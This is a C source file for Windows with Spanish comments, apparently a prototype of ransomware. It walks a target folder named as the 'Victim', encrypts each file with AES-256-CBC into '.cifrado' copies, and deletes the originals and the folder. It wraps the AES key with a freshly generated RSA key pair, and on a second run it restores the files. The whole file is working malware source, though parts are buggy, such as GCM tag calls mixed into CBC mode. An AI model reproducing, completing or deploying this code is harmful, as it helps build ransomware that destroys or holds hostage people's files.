#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <Shlwapi.h>
#include <dirent.h>
#include <direct.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>

void generateRSAKeyPair(const char *privateKeyFileName, const char *publicKeyFileName) {
    RSA *rsa = RSA_new();
    BIGNUM *e = BN_new();

    if (rsa && e) {
        if (BN_set_word(e, RSA_F4) && RSA_generate_key_ex(rsa, 2048, e, NULL)) {
            FILE *privateKeyFile = fopen(privateKeyFileName, "wb");
            FILE *publicKeyFile = fopen(publicKeyFileName, "wb");
            if (privateKeyFile) {
                PEM_write_RSAPrivateKey(privateKeyFile, rsa, NULL, NULL, 0, NULL, NULL);
                PEM_write_RSAPublicKey(publicKeyFile, rsa);
                fclose(publicKeyFile);
                fclose(privateKeyFile);
            }
        }

        BN_free(e);
        RSA_free(rsa);
    }
}

void encryptWithPublicKey(const char* inputFileName, const char* outputFileName, RSA* publicKey) {
    // Abre el archivo de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(publicKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos del archivo de entrada y los encripta con la clave pública
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int encryptedSize = RSA_public_encrypt(bytesRead, inputBuffer, outputBuffer, publicKey, RSA_PKCS1_PADDING);
            if (encryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, encryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void decryptWithPrivateKey(const char* inputFileName, const char* outputFileName, RSA* privateKey) {
    // Abre el archivo cifrado de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(privateKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos cifrados del archivo de entrada y los descifra con la clave privada
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int decryptedSize = RSA_private_decrypt(bytesRead, inputBuffer, outputBuffer, privateKey, RSA_PKCS1_PADDING);
            if (decryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, decryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void generateRandomKey(unsigned char *key, int keyLength) {
    RAND_bytes(key, keyLength);
}

void generateRandomIV(unsigned char *iv, int ivLength) {
    RAND_bytes(iv, ivLength);
}

void saveKeyToFile(const char *keyFileName, const unsigned char *key, int keyLength) {
    FILE *keyFile = fopen(keyFileName, "wb");
    if (keyFile) {
        fwrite(key, 1, keyLength, keyFile);
        fclose(keyFile);
    }
}

void saveIVToFile(const char *ivFileName, const unsigned char *iv, int ivLength) {
    FILE *ivFile = fopen(ivFileName, "wb");
    if (ivFile) {
        fwrite(iv, 1, ivLength, ivFile);
        fclose(ivFile);
    }
}


int main()
{

    // Inicializamos OpenSSL//
    OpenSSL_add_all_algorithms();

    // Definir la clave y el vector de inicialización (IV)
    unsigned char key[32];
    unsigned char iv[16];
    // Definir la ruta completa al archivo de la clave
    const char *keyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt"; 
    const char *EnckeyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt.enc"; 

    // Definir la ruta completa al archivo del IV
    const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt"; 

    // Definimos la carpeta a encriptar//
    const char *Target = "C:\\Users\\usuario\\Desktop\\Objetivo";
    DIR *Victim = opendir(Target);

    const char *Encriptado = "C:\\Users\\usuario\\Desktop\\Encriptados";
    const char *Clave = "C:\\Users\\usuario\\Desktop";
    
    struct dirent *File;

    // claves RSA //
    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\ClavePrivada.pem";
    const char *PublicKey = "C:\\Users\\usuario\\Desktop\\ClavePublica.pem";

    if ((File = readdir(Victim)) != NULL){
    int Envirao = mkdir(Encriptado);
    int Secreto = mkdir(Clave);
    generateRandomKey(key, sizeof(key));
    generateRandomIV(iv, sizeof(iv));
    generateRSAKeyPair(PrivateKey,PublicKey);

    // Lectura de los archivos del fichero //
    while ((File = readdir(Victim)) != NULL)
    {   
        
        if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
            printf("Nombre del archivo: %s\n", File->d_name);

          LPCSTR extension = PathFindExtensionA(File->d_name);

            // Comprobamos si está encriptado o no el archivo //
            // ENCRIPTAMOS //
            if(_stricmp(extension, ".cifrado") != 0){
                char inputFileName[1024];
                PathCombineA(inputFileName, Target, File->d_name);
                printf("Ruta del archivo: %s\n", inputFileName);
                FILE *inputFile = fopen(inputFileName, "rb");
                const char *enc = ".cifrado";
                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                strcat(PathCombineA(outputFileName, Encriptado, File->d_name), enc); // Concatenar la extensión ".enc"

                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida

                // Comprobamos la correcta apertura de los ficheros //
                if(inputFile && outputFile){
                    printf("se abren bien los archivos");
                    // Creamos el contexto
                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
                    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);
                    unsigned char inBuf[1024];
                    unsigned char outBuf[1040];
                    int bytesRead, bytesWritten;

                    // Comenzamos a encriptar el archivo //
                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {

                        EVP_EncryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
                        fwrite(outBuf, 1, bytesWritten, outputFile);
                        
                    }
                    EVP_EncryptFinal_ex(ctx, outBuf, &bytesWritten);
                    fwrite(outBuf, 1, bytesWritten, outputFile);

                    // Obtiene la etiqueta de autenticación
                    unsigned char tag[16];
                    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag);

                    // Escribe la etiqueta de autenticación en el archivo de salida
                    fwrite(tag, 1, sizeof(tag), outputFile);
                    
                    if (inputFile != NULL) {
                        fclose(inputFile);
                    }

                    if (outputFile != NULL) {
                        fclose(outputFile);
                    }

                    saveIVToFile(ivFileName,iv,sizeof(iv));
                    saveKeyToFile(keyFileName,key,sizeof(key));

                    FILE* publicKeyFile = fopen(PublicKey, "rb");
                    RSA* clavePublica = PEM_read_RSAPublicKey(publicKeyFile, NULL, NULL, NULL);
                    fclose(publicKeyFile);
                    encryptWithPublicKey(keyFileName,EnckeyFileName,clavePublica);
                    RSA_free(clavePublica);
                    

                    remove(inputFileName);
                    rmdir(Target);

                }else {
                    printf("Error al abrir uno o ambos archivos.\n");
                }
            }
        } 
    }
    remove(PublicKey);
    }else {
        FILE *privateKeyFile = fopen(PrivateKey, "rb");
        RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFile, NULL, NULL, NULL);
        fclose(privateKeyFile);
        decryptWithPrivateKey(EnckeyFileName,keyFileName,clavePrivada);
        RSA_free(clavePrivada);
        

        int Objetivo = mkdir(Target);
        DIR *Envirao =opendir(Encriptado);
        while ((File = readdir(Envirao)) != NULL){
            
            if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
                LPCSTR extension = PathFindExtensionA(File->d_name);

            // Comprobamos si está encriptado o no el archivo //
            // Desencriptamos //
            if(_stricmp(extension, ".cifrado") == 0){
                printf("La extensión es .cifrado \n");
                // Lee la clave y la extrae//
                FILE *keyFile = fopen(keyFileName, "rb");
                fread(key, 1, sizeof(key), keyFile);
                fclose(keyFile);

                // Comprueba que IV existe, lo lee y lo extrae//
                FILE *ivFile = fopen(ivFileName, "rb");
                if (ivFile) {
                fread(iv, 1, sizeof(iv), ivFile);
                fclose(ivFile);
        
                char inputFileName[1024];
                PathCombineA(inputFileName, Encriptado, File->d_name);
                FILE *inputFile = fopen(inputFileName, "rb");
                const char *enc = ".cifrado";
                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                char *encPtr = strstr(PathCombineA(outputFileName,Target,File->d_name), enc);

                // Si se encuentra la cadena ".enc", eliminarla
                if (encPtr != NULL) {
                    *encPtr = '\0'; // Establecer el carácter nulo en el lugar de ".enc"
                }
                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida
                if(inputFile && outputFile){
                    printf("input y output fino \n");
                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
                    EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);
                    unsigned char inBuf[1024];
                    unsigned char outBuf[1040];
                    int bytesRead, bytesWritten;

                    // Comenzamos a desencriptar el archivo //
                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {

                        EVP_DecryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
                        fwrite(outBuf, 1, bytesWritten, outputFile);
                        
                    }
                    EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
                    fwrite(outBuf, 1, bytesWritten, outputFile);

                    // Obtener la etiqueta de autenticación del archivo encriptado
                    unsigned char tag[16];
                    fread(tag, 1, sizeof(tag), inputFile);

                    // Establecer la etiqueta de autenticación en el contexto de desencriptado
                    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, sizeof(tag), tag);

                    // Verificar la autenticación
                    int result = EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
                    EVP_CIPHER_CTX_free(ctx);
                    if (inputFile != NULL) {
                        fclose(inputFile);
                    }

                    if (outputFile != NULL) {
                        fclose(outputFile);
                    }
                    remove(inputFileName);
                    
            }
        }

    }
            }
        }
        rmdir(Encriptado);
        remove(keyFileName);
        remove(ivFileName);
        remove(PrivateKey);
    }
    return 0;

}